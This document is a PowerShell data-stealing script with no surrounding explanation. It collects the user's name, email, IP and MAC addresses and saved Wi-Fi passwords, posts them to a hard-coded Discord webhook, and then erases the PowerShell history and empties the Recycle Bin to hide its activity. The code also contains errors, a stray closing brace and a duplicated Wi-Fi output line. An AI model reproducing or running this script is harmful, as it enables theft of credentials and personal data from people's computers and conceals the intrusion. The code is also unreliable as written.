# Configuration Variables
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1305290003944833035/pzY6f_l01DPtZTxZnvmKQhCCieC-Z4z1yegIXySBcxIPoZhrN-npmasRTFSuk3fflQGW"
$OutputFileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_hh-mm)_computer_recon.txt"
$OutputFilePath = "$env:TEMP\$OutputFileName"

# Function: Get Full Name
function Get-FullName {
    try {
        $fullName = (net user $env:USERNAME | Select-String -Pattern "Full Name").ToString().Trim()
        return $fullName
    } catch {
        return $env:USERNAME
    }
}

# Function: Get Email
function Get-Email {
    try {
        $email = (gpresult -z /USER $env:USERNAME | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})").ToString().Trim()
        return $email
    } catch {
        return "No Email Detected"
    }
}

# Function: Get Wi-Fi Passwords
function Get-WifiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_ -match ':\s*(.+)$' | Out-Null
            $profile = $matches[1].Trim()
            $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
            if ($keyContent) {
              "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')"
            "${profile}: No password found or access denied"

            } else {
                "$profile: No password found or access denied"
            }
        }
        return $profiles -join "`n"
    } catch {
        return "No Wi-Fi profiles found or access denied."
    }
}

# Retrieve Network Info
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
    $computerIPs = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -ExpandProperty IPAddress
    $localIP = $computerIPs -join ", "
    $MAC = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1 -ExpandProperty MacAddress
    $IsDHCPEnabled = ($computerIPs.Count -gt 0)
} catch {
    $computerPubIP = "Error getting Public IP"
    $localIP = "Error getting Local IP"
    $MAC = "Error getting MAC address"
    $IsDHCPEnabled = $false
}

# Build System Info
$FullName = Get-FullName
$Email = Get-Email
$HostName = $env:COMPUTERNAME
$WiFiPasswords = Get-WifiPasswords
$SystemDetails = "System Manufacturer: Unknown`nOperating System: Unknown"  # Placeholder for now

$SystemInfo = @"
User: $FullName
Email: $Email
Hostname: $HostName
Public IP: $computerPubIP
Local IP(s): $localIP
MAC Address: $MAC
DHCP Enabled: $IsDHCPEnabled

Wi-Fi Passwords:
$WiFiPasswords
"@

# Function: Send to Discord
function Send-ToDiscord {
    param ($Message)
    $payload = @{ content = "```$Message```" } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
        Write-Host "Sending System Info directly to Discord."

    } catch {
        Write-Error "Failed to send data to Discord."
        Write-Error $_.Exception.Message
    }
}
}

# Send the Full System Info to Discord
Send-ToDiscord -Message $SystemInfo

# Cleanup
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Signal Completion
$done = New-Object -ComObject Wscript.Shell
$done.Popup("Script execution complete", 1)


